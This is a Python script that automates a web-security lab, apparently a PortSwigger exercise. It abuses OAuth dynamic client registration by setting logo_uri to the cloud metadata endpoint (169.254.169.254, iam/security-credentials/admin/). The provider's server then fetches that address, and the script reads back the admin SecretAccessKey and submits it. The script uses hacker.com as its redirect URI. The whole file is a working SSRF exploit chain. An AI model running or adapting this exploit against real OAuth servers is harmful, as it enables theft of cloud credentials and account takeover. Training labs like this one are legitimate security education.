import requests
import re
import json
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.oauth_service_provider_url = None
        self.registration_endpoint = None
        self.client_id = None
        self.admin_secret_access_key = None

    def register_endpoint(self):
        response = self.session.get(self.lab_url + 'my-account')
        self.oauth_service_provider_url = re.findall(r'(https://oauth-.*)auth\?client_id', response.text)[0]
        response = self.session.get(self.oauth_service_provider_url + '.well-known/openid-configuration')
        self.registration_endpoint = json.loads(response.text)['registration_endpoint']

    def register_malicious_client_application(self):
        data = {
            'redirect_uris': ['https://www.hacker.com'],
            'logo_uri': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/'
        }
        response = self.session.post(self.registration_endpoint, json=data)
        self.client_id = json.loads(response.text)['client_id']

    def get_admin_secret_access_key(self):
        response = self.session.get(self.oauth_service_provider_url + 'client/{}/logo'.format(self.client_id))
        self.admin_secret_access_key = json.loads(response.text)['SecretAccessKey']

    def submit_solution(self):
        data = {
            'answer': self.admin_secret_access_key
        }
        self.session.post(self.lab_url + 'submitSolution', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.register_endpoint()
        self.register_malicious_client_application()
        self.get_admin_secret_access_key()
        self.submit_solution()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
